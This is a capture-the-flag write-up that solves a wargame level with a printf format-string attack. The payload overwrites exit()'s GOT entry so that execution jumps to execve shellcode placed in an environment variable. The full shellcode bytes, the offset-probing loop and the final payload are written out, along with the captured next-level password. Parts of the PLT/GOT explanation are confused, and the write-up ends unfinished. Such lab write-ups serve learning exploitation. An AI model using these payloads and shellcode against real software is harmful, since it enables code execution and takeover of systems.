# level05

Nothing of note with `ll` nor `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|main|
|fgets||
|exit||

Here we can see a vulnerable `printf()` since the printed string is passed raw as an argument.
It is followed by a call to `exit()`, therefore overwriting the return address of the `main()` function is not a viable option.

Notice that `checksec --file level05` tells us that there is `No RELRO`. Consequently, we can then overwrite the `exit()` function on the **PLT (Procedure Linkage Table)** that points to on the **GOT (Global Offset Table)**. The **PLT** is program dependant whereas the **GOT** is system wide and immutable.

In a nutshell it works like this

|function symbol|PLT address|address stored there|address stored there (GOT)|code pointed to|
|-|-|-|-|-|
|**exit()**|0x**0804**|0x**0901**|0x**7fe5**|**exit()** in the **LIBC**|
|||v|||
|||0x**12f4**|>|*shellcode*|

*the adresses here are for example's sake*

When a program is started, every *function symbol* (the names in the source code) gets assigned an address on the **PLT**.

When the program reaches this *function call*, the **PLT** will link the corresponding address on the **GOT** to it.
In the example, `exit()` gets assigned the address 0x**7f0a** on the **PLT**. When `exit()` is called for the first time, 0x**0901** will be stored at the address 0x**7f0a**.

0x**0901** is an address on the **GOT**, this address itself points to the address of `exit()` in the compiled LIBC.

Our goal will be to overwrite the address stored at 0x**7f0a** to be 0x**12f4**, the address of our **shellcode**.

Now when `exit()` is called it is redirected to our **shellcode** instead of `exit()` in the **LIBC**.

# Demonstration

```sh
# We need to find the address of pointed to by the `exit` symbol on the plt
gdb ./level05
p exit
	$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>	# This is the address of exit() on the plt
x/i 0x8048370
   0x8048370 <exit@plt>:	jmp    *0x80497e0	# This is the address of exit() on the got. That is what we want to overwrite


# See NOTE at the bottom for more information
```

Now we need to put our **shellcode** in the environment so that we can execute it later.

```sh
export SHELL_CODE=$(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')


# Then we need to find an address we can jump to in order to execute our shellcode
gdb ./level05
x/150s environ
[...]
0xffffdf17:	"SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀" # This is the environment variable, including the `key`
[...]

x/s 0xffffdf24
0xffffdf24:	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀" # If we offset the `key`'s address by 13, we land in the middle of our `value` which contains a nop slide which will bring us directly to our shellcode
```

Finally we have to find a way to overwrite the value stored on the **PLT**

We will use a `printf()` [string format attack](https://dev.to/duracellrabbid/journey-to-understand-format-string-attack-part-1-5dda). Basically, we pass an address as a **string-payload** to `printf()` and then we trick `printf()` into writing on this address as if it were a pointer.

But to do this we need to find the address where our **string-payload** is written.

```sh
for i in $(seq 1 24); do (echo -n "$i : "; python -c "print('aaaa %$i\$p');" | ./level05); done;
[...]
10 : aaaa 0x61616161 # < 'aaaa' in hexadecimal, so printf()'s `argument 10` is where our string-payload will be located
[...]
```

Now, this is where it gets _really_ **_really_** **complicated**. Ask Alec to make a drawing that will explain it all.

Our payload will look like this

||lower half of `exit()`'s address|upper half's address|lower half padding|targeting the 10th argument|upper half padding|targeting of the 11th argument|
|-|-|-|-|-|-|-|
|representation|0x080497e0|0x080497e2|0xdf24 - 8|%10$n|0xffff - 0xdf24|%11$n|
|raw payload|\xe0\x97\x04\x08|\xe2\x97\x04\x08|%57116c|%10$n|%8411c|%11$n|

See **NOTE2** for a more in-depth explanation on this part.

```sh
# Do not forget to export the shellcode

(cat <(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57116c" + "%10$hn" + "%8411c" + "%11$hn");') -) | ./level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
This level was easy to understand but hard to solve and even harder to explain :|

It is the sum of multiple complicated concepts and exploits.

NOTE:
```sh
# If we start the program using GDB and print 'exit', it will give us the libc address instead of the PLT's because the symbol has been mapped to the LIBC
start
p exit
	$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit> # Address in the LIBC

# We can see this address falls in the range of the LIBC
info proc mappings
[...]
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so		# < Right here
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
[...]
```

NOTE2:

Okay so there are a few important things to understand here, firstly, the `%_c` and `%_$n` `printf()` flags.

The `%42c` flag prints a character argument with a padding of **42 characters** (by default a space).

The `%_$n` flag does two things : `%4$_` acts as a tag for the 4th variadic argument in the `printf()` function call. It is a positionnal argument target.
Now the `%n` flag puts the number of characters printed *until now* inside the pointer at it's corresponding argument. So `printf("alec%n", &number);` sets the value of *number* to **4**.

Putting it all together, it does this `printf("%42c%4$n", NULL, NULL, NULL, number, NULL);` the value of *number* is now **42** and we did not need to manually put **42 bytes** in our format string.

<!-- finish explanation here -->
